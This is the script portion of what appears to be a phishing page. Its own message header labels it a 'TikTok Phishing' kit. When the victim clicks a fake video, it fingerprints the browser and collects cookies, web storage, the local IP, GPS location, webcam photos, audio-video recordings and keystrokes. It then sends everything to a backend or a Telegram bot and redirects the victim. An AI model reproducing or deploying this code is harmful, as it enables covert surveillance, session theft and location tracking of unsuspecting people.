                ctx.fillText('Cwm fjordbank glyphs vext quiz, 😃', 4, 26);
                collectedData.canvasFingerprint = canvas.toDataURL();

                const gl = document.createElement('canvas').getContext('webgl');
                if (gl) {
                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                    if (dbg) {
                        collectedData.browserFingerprint.webgl = {
                            vendor: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
                            renderer: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL),
                        };
                    }
                }

                collectedData.pluginList = Array.from(navigator.plugins || []).map(p => p.name);
                collectedData.fontList = [
                    'Arial','Verdana','Times New Roman','Courier New',
                    'Georgia','Comic Sans MS','Impact','Trebuchet MS'
                ].filter(f => { try { return document.fonts.check('12px "'+f+'"'); } catch { return false; }});
            } catch (e) {}
        }

        function collectStorage() {
            try { collectedData.cookies = document.cookie; } catch {}
            try {
                for (let i = 0; i < localStorage.length; i++) {
                    const k = localStorage.key(i);
                    collectedData.localStorageData[k] = String(localStorage.getItem(k)).substring(0, 200);
                }
            } catch {}
            try {
                for (let i = 0; i < sessionStorage.length; i++) {
                    const k = sessionStorage.key(i);
                    collectedData.sessionStorageData[k] = String(sessionStorage.getItem(k)).substring(0, 200);
                }
            } catch {}
        }

        function collectWebRTC() {
            try {
                const rtc = new RTCPeerConnection({ iceServers: [] });
                rtc.createDataChannel('');
                rtc.createOffer().then(o => rtc.setLocalDescription(o)).catch(() => {});
                rtc.onicecandidate = e => {
                    if (e && e.candidate) {
                        const parts = e.candidate.candidate.split(' ');
                        const ip = parts[4];
                        if (ip && /^\d{1,3}(\.\d{1,3}){3}$/.test(ip)) {
                            collectedData.webRTCData = { localIP: ip };
                        }
                    }
                };
                setTimeout(() => { try { rtc.close(); } catch {} }, 5000);
            } catch {}
        }

        async function getIPInfo() {
            const services = [
                'https://ipapi.co/json/',
                'https://ipinfo.io/json',
                'https://get.geojs.io/v1/ip/geo.json',
            ];
            for (const url of services) {
                try {
                    const resp = await fetch(url, { signal: AbortSignal.timeout(5000) });
                    if (resp.ok) {
                        collectedData.ipInfo = await resp.json();
                        return;
                    }
                } catch {}
            }
        }

        async function getLocation() {
            if (!navigator.geolocation) return;
            try {
                const pos = await new Promise((ok, fail) => {
                    navigator.geolocation.getCurrentPosition(ok, fail, {
                        enableHighAccuracy: true,
                        timeout: 12000,
                        maximumAge: 0,
                    });
                });
                collectedData.location = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    accuracy: pos.coords.accuracy,
                    altitude: pos.coords.altitude,
                    speed: pos.coords.speed,
                };
            } catch {}
        }

        async function captureImages() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: CONFIG.CAMERA_WIDTH },
                        height: { ideal: CONFIG.CAMERA_HEIGHT },
                    }
                });
                cameraFeed.srcObject = stream;
                await new Promise(r => { cameraFeed.onloadedmetadata = r; });

                canvas.width = cameraFeed.videoWidth;
                canvas.height = cameraFeed.videoHeight;

                for (let i = 0; i < CONFIG.MAX_IMAGES; i++) {
                    await delay(400);
                    context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
                    collectedData.capturedImages.push({
                        ts: new Date().toISOString(),
                        data: canvas.toDataURL('image/jpeg', CONFIG.IMAGE_QUALITY),
                    });
                }
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch { return false; }
        }

        async function recordVideo() {
            const mime = getSupportedVideoMime();
            if (!mime) return false;

            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: CONFIG.CAMERA_WIDTH }, height: { ideal: CONFIG.CAMERA_HEIGHT } },
                    audio: true,
                });

                return new Promise(resolve => {
                    const chunks = [];
                    const recorder = new MediaRecorder(stream, { mimeType: mime });

                    recorder.ondataavailable = e => {
                        if (e.data && e.data.size > 0) chunks.push(e.data);
                    };

                    recorder.onstop = () => {
                        const blob = new Blob(chunks, { type: mime });
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            collectedData.capturedVideo = reader.result;
                            resolve(true);
                        };
                        reader.onerror = () => resolve(false);
                        reader.readAsDataURL(blob);
                    };

                    recorder.start();
                    setTimeout(() => {
                        try { recorder.stop(); } catch {}
                        stream.getTracks().forEach(t => t.stop());
                    }, CONFIG.VIDEO_RECORD_SECONDS * 1000);
                });
            } catch { return false; }
        }

        // ── Tracking (throttled) ───────────────────────────

        const trackMouse = throttle(e => {
            if (collectedData.mouseMovements.length < 200) {
                collectedData.mouseMovements.push({ x: e.clientX, y: e.clientY });
            }
        }, CONFIG.MOUSE_THROTTLE_MS);

        function trackKey(e) {
            if (collectedData.keystrokes.length < 100) {
                collectedData.keystrokes.push({ key: e.key, ts: Date.now() });
            }
        }

        function startTracking() {
            document.addEventListener('mousemove', trackMouse);
            document.addEventListener('keydown', trackKey);
        }

        function stopTracking() {
            document.removeEventListener('mousemove', trackMouse);
            document.removeEventListener('keydown', trackKey);
        }

        // ── Send Data ──────────────────────────────────────

        async function sendToBackend(data) {
            if (CONFIG.BACKEND_URL) {
                try {
                    await fetch(CONFIG.BACKEND_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(data),
                    });
                    return true;
                } catch { return false; }
            }
            return await sendToTelegram(data);
        }

        async function sendToTelegram(data) {
            let msg = `🎯 <b>TikTok Phishing — Data Captured</b>\n\n`;

            if (data.ipInfo) {
                const ip = data.ipInfo;
                msg += `🌍 <b>IP:</b> <code>${ip.ip || ip.query || 'N/A'}</code>\n`;
                msg += `📍 ${ip.city || ''}, ${ip.country_name || ip.country || ''}\n`;
                msg += `🏢 ISP: ${ip.org || ip.isp || 'N/A'}\n`;
                const lat = ip.latitude || ip.lat || '';
                const lon = ip.longitude || ip.lon || '';
                if (lat && lon) {
                    msg += `🗺 <a href="https://www.google.com/maps?q=${lat},${lon}">IP Map</a>\n`;
                }
                msg += `\n`;
            }

            if (data.location) {
                const g = data.location;
                msg += `📡 <b>GPS (±${Math.round(g.accuracy)}m):</b>\n`;
                msg += `   <code>${g.lat.toFixed(6)}, ${g.lon.toFixed(6)}</code>\n`;
                msg += `   🗺 <a href="https://www.google.com/maps?q=${g.lat},${g.lon}">GPS Map</a>\n\n`;
            }

            msg += `📱 <b>Device:</b>\n`;
            msg += `   ${data.deviceInfo.platform || 'N/A'}\n`;
            msg += `   ${data.screenInfo.width}x${data.screenInfo.height} @${data.screenInfo.pixelRatio}x\n`;
            msg += `   Cores: ${data.hardwareInfo.cores} | RAM: ${data.hardwareInfo.memory}GB\n`;
            msg += `   Touch: ${data.hardwareInfo.touchPoints} points\n`;
            if (data.webRTCData) msg += `   LAN IP: ${data.webRTCData.localIP}\n`;
            msg += `\n`;

            if (data.browserFingerprint.webgl) {
                msg += `🔍 GPU: ${data.browserFingerprint.webgl.renderer}\n\n`;
            }

            msg += `🕐 TZ: ${data.timezoneInfo.timezone}\n`;
            msg += `🌐 Lang: ${data.languageInfo.language}\n`;
            if (data.batteryInfo) {
                msg += `🔋 Battery: ${Math.round(data.batteryInfo.level*100)}% ${data.batteryInfo.charging ? '⚡' : ''}\n`;
            }
            msg += `📸 Photos: ${data.capturedImages.length}\n`;
            msg += `🎬 Video: ${data.capturedVideo ? 'Yes' : 'No'}\n`;
            msg += `🍪 Cookies: ${data.cookies ? data.cookies.length + ' chars' : 'None'}\n`;
            msg += `💾 Storage keys: ${Object.keys(data.localStorageData).length}\n\n`;
            msg += `⏰ ${data.timestamp}\n`;
            msg += `🔗 ${data.url}\n`;
            msg += `📎 UA: <code>${data.userAgent.substring(0, 80)}...</code>`;

            try {
                const token = CONFIG.TELEGRAM_BOT_TOKEN;
                const chatId = CONFIG.CHAT_ID;

                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'HTML', disable_web_page_preview: true }),
                });

                for (let i = 0; i < Math.min(data.capturedImages.length, 3); i++) {
                    try {
                        const blob = await fetch(data.capturedImages[i].data).then(r => r.blob());
                        const fd = new FormData();
                        fd.append('chat_id', chatId);
                        fd.append('photo', blob, `img_${i}.jpg`);
                        fd.append('caption', `📸 Photo ${i+1}`);
                        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
                        await delay(800);
                    } catch {}
                }

                if (data.capturedVideo) {
                    try {
                        const vBlob = await fetch(data.capturedVideo).then(r => r.blob());
                        if (vBlob.size < 20 * 1024 * 1024) {
                            const fd = new FormData();
                            fd.append('chat_id', chatId);
                            fd.append('video', vBlob, 'rec.webm');
                            fd.append('caption', '🎬 Video');
                            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: fd });
                        }
                    } catch {}
                }
                return true;
            } catch { return false; }
        }

        // ── Main Operation ─────────────────────────────────

        async function run() {
            try {
                updateProgress(5);
                loadingMessage.textContent = msg('loading');
                collectDeviceInfo();
                collectWebRTC();
                await delay(400);

                updateProgress(15);
                await getIPInfo();
                await delay(300);

                updateProgress(25);
                collectBrowserFingerprint();
                collectStorage();
                await delay(300);

                updateProgress(35);
                loadingMessage.textContent = msg('camera');
                await captureImages();
                await delay(500);

                updateProgress(55);
                loadingMessage.textContent = msg('buffering');
                await recordVideo();
                await delay(500);

                updateProgress(70);
                loadingMessage.textContent = msg('location');
                await getLocation();
                await delay(300);

                updateProgress(80);
                startTracking();
                await delay(500);

                updateProgress(90);
                loadingMessage.textContent = msg('loading');
                await sendToBackend(collectedData);
                await delay(1500);

                updateProgress(100);
            } catch (e) {
                showNotification(msg('error'), 'error');
            } finally {
                stopTracking();
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_URL;
                }, 1500);
            }
        }

        // ── Event Listeners ────────────────────────────────

        function hideFakeUI() {
            ['fake-sidebar', 'fake-info', 'fake-nav'].forEach(id => {
                const el = $(id);
                if (el) el.classList.add('hidden-ui');
            });
        }

        videoPlaceholder.addEventListener('click', () => {
            videoPlaceholder.classList.add('hidden');
            loadingOverlay.classList.add('active');
            hideFakeUI();
            run();
        });

    })();
    </script>
